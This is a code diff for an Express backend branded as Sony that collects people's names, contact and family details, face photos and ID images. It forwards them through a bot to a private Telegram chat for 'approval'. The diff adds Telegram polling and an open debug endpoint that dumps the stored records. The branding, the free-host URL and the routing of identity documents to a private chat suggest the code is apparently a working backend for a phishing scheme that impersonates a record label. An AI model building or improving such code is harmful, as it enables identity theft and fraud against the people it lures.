@@ -17,32 +17,32 @@ app.use(express.urlencoded({ extended: true, limit: '20mb' }));
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });
 
-// IN-MEMORY STATUS STORE (use DB in production if you want persistence)
-const approvals = {}; // contractId -> { status: 'pending'|'accepted'|'rejected', reason, artistName, time }
+const approvals = {};
+let lastUpdateId = 0;
 
 app.get("/", (req, res) => {
-  res.send(`<h1>Sony Backend Live ✓</h1>
-  <p>POST /api/forward-to-telegram (face + ID image) -> sends Accept/Reject buttons</p>
+  res.send(`<h1>Sony Backend Live ✓ FIXED POLLING</h1>
+  <p>POST /api/forward-to-telegram -> sends Accept/Reject buttons</p>
   <p>GET /api/status/:contractId -> frontend polling</p>
-  <p>POST /webhook -> Telegram callback for Accept/Reject</p>`);
+  <p>POST /webhook -> Telegram callback</p>
+  <p><a href="/debug/approvals">Debug approvals</a></p>`);
 });
 app.get("/health", (req, res) => res.send("OK"));
+app.get("/debug/approvals", (req, res) => res.json(approvals));
 
-// STATUS POLLING ENDPOINT - frontend calls this every 3s
+// FIXED: never 404, always return pending so frontend keeps polling
 app.get("/api/status/:contractId", (req, res) => {
   const id = req.params.contractId;
   const data = approvals[id];
-  if (!data) return res.status(404).json({ status: 'not_found' });
+  if (!data) return res.json({ status: 'pending', contractId: id, note: 'waiting for approval data - instance may have restarted' });
   res.json(data);
 });
 
-// HELPER: send photo with Accept/Reject buttons
 async function sendApprovalRequest({ contractId, artistName, legalName, phone, region, faceBuffer, idBuffer }) {
   if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) {
     console.log("Missing env");
     return;
   }
-
   const caption = `
 🎤 *NEW CONTRACT - REQUIRES APPROVAL* 🎤
 ━━━━━━━━━━━━━━━━━━━━
@@ -57,7 +57,6 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
 🖼️ Face + ID image attached
 👇 *Choose:*
 `;
-
   const keyboard = {
     inline_keyboard: [
       [
@@ -66,10 +65,7 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
       ]
     ]
   };
-
-  // Send face + ID as media group first, then approval message with buttons
   try {
-    // 1. Send face photo
     if (faceBuffer) {
       const form = new FormData();
       form.append('chat_id', SUPERVISOR_CHAT_ID);
@@ -77,7 +73,6 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
       form.append('caption', `Face: ${artistName} | ${contractId}`);
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
     }
-    // 2. Send ID image photo
     if (idBuffer) {
       const form2 = new FormData();
       form2.append('chat_id', SUPERVISOR_CHAT_ID);
@@ -85,35 +80,27 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
       form2.append('caption', `Artist ID Image: ${artistName} | 1100223 | ${contractId}`);
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form2, { headers: form2.getHeaders() });
     }
-    // 3. Send approval buttons message
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: SUPERVISOR_CHAT_ID,
       text: caption,
       parse_mode: "Markdown",
       reply_markup: keyboard
     });
-
   } catch (e) {
     console.error("Telegram send error", e.response?.data || e.message);
   }
 }
 
-// MAIN ENDPOINT - receives from frontend
 app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: 'facePhoto' }, { name: 'idPhoto' }, { name: 'photo', maxCount: 5 }]), async (req, res) => {
   try {
     const body = req.body || {};
     const files = req.files || {};
-
-    // Support both single file and fields
     let faceBuffer = null;
     let idBuffer = null;
-
     if (req.file && req.file.buffer) faceBuffer = req.file.buffer;
     if (files.photo && files.photo[0]) faceBuffer = files.photo[0].buffer;
     if (files.facePhoto && files.facePhoto[0]) faceBuffer = files.facePhoto[0].buffer;
     if (files.idPhoto && files.idPhoto[0]) idBuffer = files.idPhoto[0].buffer;
-
-    // base64 fallbacks
     if (!faceBuffer && body.facePhotoBase64 && body.facePhotoBase64.startsWith('data:image')) {
       faceBuffer = Buffer.from(body.facePhotoBase64.split(';base64,').pop(), 'base64');
     }
@@ -123,11 +110,9 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
     if (!idBuffer && body.idPhotoBase64 && body.idPhotoBase64.startsWith('data:image')) {
       idBuffer = Buffer.from(body.idPhotoBase64.split(';base64,').pop(), 'base64');
     }
-
-    const { artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId, type, countryCode } = body;
+    const { artistName, legalName, age, email, phone, address, married, kids, kidsNum, region, contractId, type } = body;
     const finalCid = contractId || `SME-2026-${Math.floor(100+Math.random()*900)}-AF`;
 
-    // If it's the approval step (has ID image), set pending and send buttons
     if (type === 'REQUIRES_APPROVAL' || idBuffer) {
       approvals[finalCid] = {
         status: 'pending',
@@ -135,7 +120,6 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
         contractId: finalCid,
         time: new Date().toISOString()
       };
-
       await sendApprovalRequest({
         contractId: finalCid,
         artistName: artistName || 'Unknown',
@@ -145,11 +129,9 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
         faceBuffer,
         idBuffer
       });
-
-      return res.json({ success: true, status: 'pending', contractId: finalCid, message: 'Sent for supervisor approval with Accept/Reject buttons' });
+      return res.json({ success: true, status: 'pending', contractId: finalCid, message: 'Sent for approval with Accept/Reject buttons' });
     }
 
-    // Step 1 - just face submitted
     const text = `
 🎤 *NEW SONY CONTRACT (STEP 1 - FACE)* 🎤
 ━━━━━━━━━━━━━━━━━━━━
@@ -179,23 +161,19 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
         parse_mode: "Markdown"
       });
     }
-
     res.json({ success: true, contractId: finalCid });
-
   } catch (e) {
     console.error(e.response?.data || e.message);
     res.status(500).json({ error: "Failed", details: e.response?.data || e.message });
   }
 });
 
-// ID CARD ENDPOINT (kept for compatibility)
 app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
   try {
     const { artistName, contractId } = req.body || {};
     const buf = req.file?.buffer;
     if (!buf) return res.status(400).json({ error: "No image" });
     if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) return res.json({ success: true, forwarded: false });
-
     const form = new FormData();
     form.append('chat_id', SUPERVISOR_CHAT_ID);
     form.append('document', buf, { filename: `SONY_ID_${artistName}_${contractId}.png`, contentType: 'image/png' });
@@ -209,60 +187,51 @@ app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
   }
 });
 
-// TELEGRAM WEBHOOK - handles Accept/Reject clicks
+async function handleCallback(cq){
+  const data=cq.data;
+  const chatId=cq.message.chat.id;
+  const messageId=cq.message.message_id;
+  try{
+    if(data.startsWith('accept_')){
+      const cid=data.replace('accept_','');
+      approvals[cid]={...(approvals[cid]||{}), status:'accepted', contractId:cid, artistName:approvals[cid]?.artistName||'', time:new Date().toISOString()};
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`✅ Accepted ${cid}`});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+    }else if(data.startsWith('reject_')){
+      const cid=data.replace('reject_','');
+      approvals[cid]={...(approvals[cid]||{}), status:'rejected', reason:'Rejected by supervisor - Invalid ID image', contractId:cid, time:new Date().toISOString()};
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`❌ Rejected ${cid}`});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid verification\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+    }
+  }catch(e){ console.error("handleCallback", e.response?.data||e.message); }
+}
+
 app.post("/webhook", async (req, res) => {
   try {
-    const update = req.body;
-    if (update.callback_query) {
-      const cq = update.callback_query;
-      const data = cq.data; // accept_SME-... or reject_SME-...
-      const chatId = cq.message.chat.id;
-      const messageId = cq.message.message_id;
-
-      if (data.startsWith('accept_')) {
-        const cid = data.replace('accept_', '');
-        approvals[cid] = {...(approvals[cid] || {}), status: 'accepted', contractId: cid, time: new Date().toISOString() };
-
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-          callback_query_id: cq.id,
-          text: `✅ Accepted ${cid}`
-        });
-
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-          chat_id: chatId,
-          message_id: messageId,
-          text: `✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName || ''}\nTime: ${new Date().toLocaleString()}`,
-          parse_mode: "Markdown"
-        });
-
-      } else if (data.startsWith('reject_')) {
-        const cid = data.replace('reject_', '');
-        approvals[cid] = {...(approvals[cid] || {}), status: 'rejected', reason: 'Rejected by supervisor - Invalid ID image', contractId: cid, time: new Date().toISOString() };
-
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-          callback_query_id: cq.id,
-          text: `❌ Rejected ${cid}`
-        });
-
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-          chat_id: chatId,
-          message_id: messageId,
-          text: `❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid verification\nTime: ${new Date().toLocaleString()}`,
-          parse_mode: "Markdown"
-        });
-      }
-    }
+    if(req.body.callback_query) await handleCallback(req.body.callback_query);
     res.sendStatus(200);
   } catch (e) {
-    console.error("webhook error", e.response?.data || e.message);
     res.sendStatus(200);
   }
 });
 
-// Optional: set webhook endpoint helper
+// AUTO POLLING FIX - works without webhook
+async function pollTelegram(){
+  if(!BOT_TOKEN) return;
+  try{
+    const r=await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`);
+    const updates=r.data?.result||[];
+    for(const up of updates){
+      lastUpdateId=Math.max(lastUpdateId, up.update_id);
+      if(up.callback_query) await handleCallback(up.callback_query);
+    }
+  }catch(e){}
+}
+setInterval(pollTelegram, 3000);
+
 app.get("/set-webhook", async (req, res) => {
-  const url = req.query.url; // e.g. https://yourdomain.onrender.com/webhook
-  if (!url) return res.send("Add?url=https://yourdomain.onrender.com/webhook");
+  const url = req.query.url;
+  if (!url) return res.send("Add?url=https://sonymusic.onrender.com/webhook");
   try {
     const r = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(url)}`);
     res.json(r.data);
@@ -271,4 +240,4 @@ app.get("/set-webhook", async (req, res) => {
   }
 });
 
-app.listen(PORT, () => console.log(`Sony supervisor bot with Accept/Reject running on ${PORT}`));
+app.listen(PORT, () => console.log(`Sony supervisor bot FIXED polling on ${PORT}`));
